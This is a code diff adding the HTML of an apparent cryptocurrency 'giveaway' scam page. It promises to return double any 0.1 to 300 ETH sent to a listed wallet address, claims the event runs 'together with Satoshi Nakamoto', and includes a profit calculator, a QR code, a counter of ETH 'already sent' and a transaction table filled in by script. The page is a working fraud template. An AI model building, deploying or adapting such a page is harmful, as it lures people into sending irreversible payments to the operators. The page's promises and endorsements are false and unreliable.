@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="icon" href="images/eth_change.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Roboto:wght@300;400;500&display=swap"
+        rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="js/moment.js"></script>
+
+    <link rel="stylesheet" href="css/style.min.css">
+</head>
+
+<body>
+    <div class="wrapper">
+        <header class="header" id="header">
+            <div class="header__top">
+                <p class="header__top-text">
+                  Ethereum giveaway started. Participate now!
+                </p>
+            </div>
+            <div class="container">
+                <div class="header__menu menu">
+                    <button type="button" class="menu__icon icon-menu"><span></span><span></span><span></span></button>
+                    <nav class="menu__body">
+                        <a class="logo" href="#header"><img class="logo__img" src="images/logo_2.svg" alt="logo"></a>
+                        <ul class="menu__list">
+                            <li class="menu__item"><a href="#about" class="menu__link">About</a></li>
+                            <li class="menu__item"><a href="#rules" class="menu__link">Rules</a></li>
+                            <li class="menu__item"><a href="#calculate" class="menu__link">Calculate</a></li>
+                            <li class="menu__item"><a href="#participate" class="menu__link">Participate</a></li>
+                        </ul>
+                    </nav>
+                </div>
+                <div class="header__content header__content--eth">
+                    <div class="container">
+                        <div class="content__left">
+                            <h1 class="content__title">Join the giveaway <br>1,000,000 Eth</h1>
+                            <p class="content__text">During a&nbsp;unique event we&nbsp;will give you a&nbsp;chance
+                                to&nbsp;get up
+                                <br>to&nbsp;1,000,000&nbsp;ETH, read the rules and don&rsquo;t miss your chance!
+                            </p>
+                            <a class="content__btn btn" href="#calculate">Participate</a>
+                            <a class="content__btn-outline" href="#about">Read rules</a>
+                        </div>
+                        <!-- <ul class="content__right">
+            <li class="content__right-item">You received 0.4 BTC</li>
+            <li class="content__right-item">You received 5 BTC</li>
+            <li class="content__right-item">You received 25 BTC</li>
+            <li class="content__right-item">You received 200 BTC</li>
+          </ul> -->
+                    </div>
+                </div>
+            </div>
+        </header>
+        <main class="main">
+            <section class="about" id="about">
+                <div class="container">
+                    <div class="about__content-header">
+                        <div class="about-event">
+                            <h3 class="about-event__title title">About event</h3>
+                            <div class="about-event__text">
+                                <p>We&nbsp;believe that ethereum will make the world. To&nbsp;accelerate the mass adoption
+                                    of&nbsp;cryptocurrencies we&nbsp;decided to&nbsp;giveaway 1,000,000&nbsp;ETH
+                                    to&nbsp;all
+                                    cryptocurrency
+                                    holders together with Satoshi Nakamoto.</p>
+                            </div>
+                        </div>
+                        <div class="about-how">
+                            <h3 class="about-how__title title">
+                                how to participate
+                            </h3>
+                            <div class="about-how__bg">
+                                <ol class="about-how__list">
+                                    <li>Read the rules
+                                    </li>
+                                    <li>Make a deposit
+                                    </li>
+                                    <li>Get a prize
+                                    </li>
+                                </ol>
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="about__content-middle">
+                        <div class="about-rules about-rules__eth" id="rules">
+                            <h3 class="about-rules__title title">Rules event</h3>
+                            <div class="about-rules__text">
+                                <p>To&nbsp;participate you just need to&nbsp;send from 0.1&nbsp;ETH to&nbsp;300&nbsp;ETH
+                                    to&nbsp;the
+                                    contribution address and we&nbsp;will immediately send you back 0.2&nbsp;ETH
+                                    to&nbsp;600&nbsp;ETH
+                                    (x2&nbsp;back) to&nbsp;the address you sent it&nbsp;from.</p>
+                                <p class="about-rules__text--red">You can only participate once</p>
+                            </div>
+                        </div>
+                        <div class="about-example">
+                            <h3 class="about-example__title title">
+                                Example of deposits
+                            </h3>
+                            <ul class="about-example__list">
+                                <li class="about-example__item">
+                                    <p class="about-example__text">Send 0.1 ETH
+                                        <span><svg width="14" height="14" viewBox="0 0 14 14" fill="none"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="M7 14C3.1339 14 0 10.8661 0 7C0 3.1339 3.1339 0 7 0C10.8661 0 14 3.1339 14 7C14 10.8661 10.8661 14 7 14ZM7 4.9H4.2V6.3H10.5L7 2.8V4.9ZM3.5 7.7L7 11.2V9.1H9.8V7.7H3.5Z"
+                                                    fill="white" />
+                                            </svg></span>Receive 0.2 ETH
+                                    </p>
+                                </li>
+                                <li class="about-example__item">
+                                    <p class="about-example__text">Send 10 ETH
+                                        <span><svg width="14" height="14" viewBox="0 0 14 14" fill="none"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="M7 14C3.1339 14 0 10.8661 0 7C0 3.1339 3.1339 0 7 0C10.8661 0 14 3.1339 14 7C14 10.8661 10.8661 14 7 14ZM7 4.9H4.2V6.3H10.5L7 2.8V4.9ZM3.5 7.7L7 11.2V9.1H9.8V7.7H3.5Z"
+                                                    fill="white" />
+                                            </svg></span>Receive 20 ETH
+                                    </p>
+                                </li>
+                                <li class="about-example__item">
+                                    <p class="about-example__text">Send 50 ETH
+                                        <span><svg width="14" height="14" viewBox="0 0 14 14" fill="none"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="M7 14C3.1339 14 0 10.8661 0 7C0 3.1339 3.1339 0 7 0C10.8661 0 14 3.1339 14 7C14 10.8661 10.8661 14 7 14ZM7 4.9H4.2V6.3H10.5L7 2.8V4.9ZM3.5 7.7L7 11.2V9.1H9.8V7.7H3.5Z"
+                                                    fill="white" />
+                                            </svg></span>Receive 100 ETH
+                                    </p>
+                                </li>
+                                <li class="about-example__item">
+                                    <p class="about-example__text">Send 100 ETH
+                                        <span><svg width="14" height="14" viewBox="0 0 14 14" fill="none"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="M7 14C3.1339 14 0 10.8661 0 7C0 3.1339 3.1339 0 7 0C10.8661 0 14 3.1339 14 7C14 10.8661 10.8661 14 7 14ZM7 4.9H4.2V6.3H10.5L7 2.8V4.9ZM3.5 7.7L7 11.2V9.1H9.8V7.7H3.5Z"
+                                                    fill="white" />
+                                            </svg></span>Receive 200 ETH
+                                    </p>
+                                </li>
+                                <li class="about-example__item">
+                                    <p class="about-example__text">Send 300 ETH
+                                        <span><svg width="14" height="14" viewBox="0 0 14 14" fill="none"
+                                                xmlns="http://www.w3.org/2000/svg">
+                                                <path
+                                                    d="M7 14C3.1339 14 0 10.8661 0 7C0 3.1339 3.1339 0 7 0C10.8661 0 14 3.1339 14 7C14 10.8661 10.8661 14 7 14ZM7 4.9H4.2V6.3H10.5L7 2.8V4.9ZM3.5 7.7L7 11.2V9.1H9.8V7.7H3.5Z"
+                                                    fill="white" />
+                                            </svg></span>Receive 600 ETH
+                                    </p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="form" id="calculate">
+                        <h3 class="about-form__title title">
+                            Calculate your prize
+                        </h3>
+                        <div class="form__wrapper">
+                            <div class="form__inner">
+                                <form oninput="d.value = e.valueAsNumber * 2">
+                                    <div class="form__col">
+                                        <label for="e" class="form__label">How many ETH do you send? </label>
+                                        <input name="form-send" class="form__input" type="number" id="e"
+                                            placeholder="from 0.2 to 300">
+                                    </div>
+                                    <div class="form__col">
+                                        <label class="form__label" for="e">Your profit:</label>
+                                        <mark class="form__mark"> <output class="form__output" name="d" for="e">
+                                            </output> </mark>
+                                    </div>
+                                    <a class="form__btn btn" href="#calculate">Participate</a>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section class="qr">
+                <div class="container">
+                    <div class="qr__inner">
+                        <div class="qr__content">
+                            <h3 class="qr__content-title">
+                                <span>
+                                    <span id="trans_amount"></span> ETH
+                                </span>
+                                have already been sent to&nbsp;participants
+                            </h3>
+                            <p class="qr__content-text">
+                                You can send ETH to the following address or scan QR-code
+                            </p>
+                            <div class="qr__btn">
+                                <div class="qr__input" id="copytext1">
+                                    <p class="qr__content-copy"><span>0x19431F755b52Ac0BCd3c135B2942cF89eB375597</span></p>
+                                </div>
+                                <button class="qr__content-btn" onclick="copytext('#copytext1')">copy</button>
+                            </div>
+                        </div>
+                        <img class="qr__img" src="images/qr_code.svg" alt="qr code">
+                    </div>
+                </div>
+            </section>
+            <div class="table" id="participate">
+                <div class="container">
+                    <table class="table__content">
+                        <thead>
+                            <tr class="table__title">
+                                <th scope="col">TxHash</th>
+                                <th scope="col">Block</th>
+                                <th scope="col">From</th>
+                                <th scope="col">To</th>
+                                <th scope="col">Value</th>
+                                <th scope="col">Fee</th>
+                                <th scope="col">Age</th>
+                                <th scope="col">Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="table_body">
+                            <!-- тута хуета всякая -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+
+        </main>
+        <footer class="footer">
+            <div class="container">
+                <nav class="footer__body">
+                    <a class="logo" href="#header"><img class="logo__img" src="images/logo_2.svg" alt="logo"></a>
+                    <ul class="footer-menu__list">
+                        <li class="footer-menu__item"><a href="#about" class="footer-menu__link">About</a></li>
+                        <li class="footer-menu__item"><a href="#rules" class="footer-menu__link">Rules</a></li>
+                        <li class="footer-menu__item"><a href="#calculate" class="footer-menu__link">Calculate</a></li>
+                        <li class="footer-menu__item"><a href="#participate" class="footer-menu__link">Participate</a>
+                        </li>
+                    </ul>
+                    <a class="footer__btn btn" href="#calculate">Participate</a>
+                </nav>
+
+            </div>
+        </footer>
+    </div>
+
+
+
+
+    <script src="js/eth.main.min.js"></script>
+</body>
+
+</html>
